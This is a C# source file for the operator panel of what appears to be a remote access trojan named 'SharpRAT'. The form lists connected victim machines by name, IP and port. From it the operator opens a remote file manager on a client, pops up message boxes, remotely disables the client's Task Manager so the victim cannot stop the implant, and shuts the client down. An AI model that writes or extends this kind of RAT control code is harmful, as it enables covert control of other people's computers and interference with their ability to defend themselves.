using Server.Server;

namespace Server
{
    public partial class Main : Form
    {
        private string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SharpRAT";
        private readonly ImageList imageList;
        public static SocketServer socketServer;
        public static RequestUI uiRequests;

        public Main()
        {
            socketServer = new SocketServer();
            uiRequests = new RequestUI();
            imageList = new ImageList();
            InitializeComponent();
        }

        private void AddUserToViewlist(string text)
        {
            // Parse text
            string
                szName = text.Split("<SPLIT>")[0],
                szIPAddress = text.Split("<SPLIT>")[1],
                szPort = text.Split("<SPLIT>")[2];

            // Add data to viewList.
            Bitmap image;
            image = WinIcons.GetImageFromIcon("dsuiext.dll", (int)WinIcons.Dsuiext.User);
            imageList.Images.Add(image);
            imageList.ColorDepth = ColorDepth.Depth32Bit; // Improves quality of the image.
            userView.SmallImageList = imageList;
            userView.View = View.Details;
            ListViewItem userViewItem = new ListViewItem { ImageIndex = imageList.Images.Count - 1, Text = szName };
            userViewItem.SubItems.Add(szIPAddress);
            userViewItem.SubItems.Add(szPort);
            userView.Items.Add(userViewItem);

            // Log the new connection.
            Log.Info($"Client {szName} - [{szIPAddress}:{szPort}] connected.");
        }

        private void RemoveUserFromViewlist(string text)
        {
            int index = int.Parse(text);
            try
            {
                Log.Info($"Client {userView.Items[index].Text} - [{userView.Items[index].SubItems[1].Text}:" +
                    $"{userView.Items[index].SubItems[2].Text}] disconnected.");
                userView.Items[index].Remove();
                userView.Update();
            }
            catch (Exception ex)
            {
                Log.Error(ex.Message);
            }
        }

        private void UpdateStatus(string statusText)
        {
            statusLbl.Text = "Status: " + statusText;
        }

        private void LoadImagesForUI()
        {
            /* 
             Load icons from Windows internal dlls with quite bad quality,
             it would be smarter to extract the icon files to TEMP and load them from there for better quality.
            */
            settingsToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Settings, false);
            sendMessageBoxToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.PcKeyboard);
            fileManagerToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.FilledFolder, false);
            userControlToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Keychain, false);
            disableTaskmanagerToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.NotAllowed);
            shutdownClientToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Shutdown, false);
        }

        private void Main_Load(object sender, EventArgs e)
        {
            // Create directory if it does not exist.
            if (!File.Exists(folderPath))
                Directory.CreateDirectory(folderPath);

            // Load config values if the config exists.
            if (File.Exists(User.Config.GetConfigPath()))
                User.Config.Read();

            LoadImagesForUI();

            if(User.Config.bRunServer)
                socketServer.StartServer();
        }

        private void uiUpdateTimer_Tick(object sender, EventArgs e)
        {
            int requestID = uiRequests.RequestReceived();
            if (requestID != 0) // Another thread requested UI to update requsted item.
            {
                switch(uiRequests.GetRequestType(requestID)) // Check request type and call the correct function.
                {
                    case RequestUI.RequestType.UI_ADD_USER:
                        AddUserToViewlist(uiRequests.GetRequestText(requestID));
                        break;
                    case RequestUI.RequestType.UI_REMOVE_USER:
                        RemoveUserFromViewlist(uiRequests.GetRequestText(requestID));
                        break;
                    case RequestUI.RequestType.UI_UPDATE_STATUS:
                        UpdateStatus(uiRequests.GetRequestText(requestID));
                        break;
                }
            }
        }

        private void sendMessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageboxCreator messageboxCreator = new MessageboxCreator(socketServer, userView.SelectedItems[0].Index);
            messageboxCreator.ShowDialog();
        }

        private void userMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (userView.SelectedItems.Count == 0) // No items selected, no need to open.
            {
                e.Cancel = true;
                return;
            }
        }

        private void disableTaskmanagerToolStripMenuItem_CheckedChanged(object sender, EventArgs e)
        {
            string messageBoxStr
                = "<SET-TASKMGR>" + Convert.ToInt32(disableTaskmanagerToolStripMenuItem.Checked).ToString();
            socketServer.Send(SocketServer.GetClient(userView.SelectedItems[0].Index).socket, messageBoxStr);
        }

        private void shutdownClientToolStripMenuItem_Click(object sender, EventArgs e)
        {
            socketServer.Send(SocketServer.GetClient(userView.SelectedItems[0].Index).socket, "<SHUTDOWN-CLIENT>");
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            UI.Settings settings = new();
            settings.ShowDialog();
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            UI.FileManager fileManager = new(userView.SelectedItems[0].Index);
            fileManager.ShowDialog();
        }
    }
}